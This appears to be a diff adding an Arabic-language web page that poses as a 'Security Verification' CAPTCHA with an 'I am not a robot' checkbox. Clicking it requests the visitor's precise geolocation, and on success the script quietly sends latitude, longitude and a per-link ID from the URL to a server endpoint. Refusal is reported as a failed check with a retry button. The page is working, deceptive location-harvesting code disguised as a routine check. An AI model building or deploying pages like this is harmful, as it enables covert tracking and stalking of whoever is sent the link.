@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>التحقق الأمني</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #eaf2f8;
+            margin: 0;
+        }
+        .security-box {
+            background-color: white;
+            border: 1px solid #dcdcdc;
+            border-radius: 8px;
+            padding: 25px;
+            width: 90%;
+            max-width: 340px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        .security-box h2 {
+            margin-top: 0;
+            color: #333;
+            font-size: 22px;
+        }
+        .security-box p {
+            color: #666;
+            font-size: 15px;
+        }
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            justify-content: start;
+            padding: 15px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            margin-top: 20px;
+            cursor: pointer;
+            background-color: #f9f9f9;
+            transition: border-color 0.2s;
+        }
+        .checkbox-container.disabled {
+            cursor: default;
+            background-color: #eee;
+        }
+        .checkbox {
+            width: 28px;
+            height: 28px;
+            border: 2px solid #c1c1c1;
+            border-radius: 4px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-shrink: 0;
+        }
+        .checkbox .fa-check, .checkbox .fa-times {
+            font-size: 20px;
+            display: none;
+        }
+        .checkbox .fa-check { color: #28a745; }
+        .checkbox .fa-times { color: #dc3545; }
+        .checkbox .spinner {
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(0, 0, 0, 0.1);
+            border-left-color: #007bff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            display: none;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .checkbox-label {
+            margin-right: 12px;
+            font-size: 16px;
+            color: #444;
+        }
+        #status {
+            margin-top: 15px;
+            font-weight: bold;
+            min-height: 20px;
+        }
+        #retryBtn {
+            background-color: #007bff;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 15px;
+            display: none;
+        }
+        #retryBtn:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+    <div class="security-box">
+        <i class="fas fa-shield-alt" style="font-size: 40px; color: #007bff;"></i>
+        <h2>التحقق الأمني</h2>
+        <p>للمتابعة، يرجى إكمال التحقق التالي.</p>
+        <div id="robotCheckbox" class="checkbox-container">
+            <div class="checkbox">
+                <i class="fas fa-check"></i>
+                <i class="fas fa-times"></i>
+                <div class="spinner"></div>
+            </div>
+            <span class="checkbox-label">أنا لست برنامج روبوت</span>
+        </div>
+        <p id="status"></p>
+        <button id="retryBtn">إعادة التحقق</button>
+    </div>
+
+    <script>
+        const checkboxContainer = document.getElementById('robotCheckbox');
+        const checkIcon = document.querySelector('.fa-check');
+        const timesIcon = document.querySelector('.fa-times');
+        const spinner = document.querySelector('.spinner');
+        const statusDiv = document.getElementById('status');
+        const retryBtn = document.getElementById('retryBtn');
+        let isClicked = false;
+
+        function startVerification() {
+            isClicked = true;
+            checkboxContainer.classList.add('disabled');
+            spinner.style.display = 'block';
+            checkIcon.style.display = 'none';
+            timesIcon.style.display = 'none';
+            retryBtn.style.display = 'none';
+            statusDiv.textContent = 'جارٍ التحقق...';
+            statusDiv.style.color = '#5bc0de';
+
+            navigator.geolocation.getCurrentPosition(success, error, {
+                enableHighAccuracy: true,
+                timeout: 20000,
+                maximumAge: 0
+            });
+        }
+
+        checkboxContainer.addEventListener('click', () => {
+            if (!isClicked) {
+                startVerification();
+            }
+        });
+
+        retryBtn.addEventListener('click', () => {
+            startVerification();
+        });
+
+        function success(position) {
+            spinner.style.display = 'none';
+            checkIcon.style.display = 'block';
+            statusDiv.textContent = '✅ تم التحقق بنجاح!';
+            statusDiv.style.color = '#28a745';
+
+            const pathParts = window.location.pathname.split('/');
+            const linkId = pathParts[pathParts.length - 1];
+
+            fetch('/api/save-location', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    lat: position.coords.latitude,
+                    lon: position.coords.longitude,
+                    linkId: linkId
+                })
+            });
+        }
+
+        function error() {
+            spinner.style.display = 'none';
+            timesIcon.style.display = 'block';
+            statusDiv.textContent = '❌ فشل التحقق. الإذن مطلوب لإكمال العملية.';
+            statusDiv.style.color = '#dc3545';
+            retryBtn.style.display = 'block';
+        }
+    </script>
+</body>
+</html>
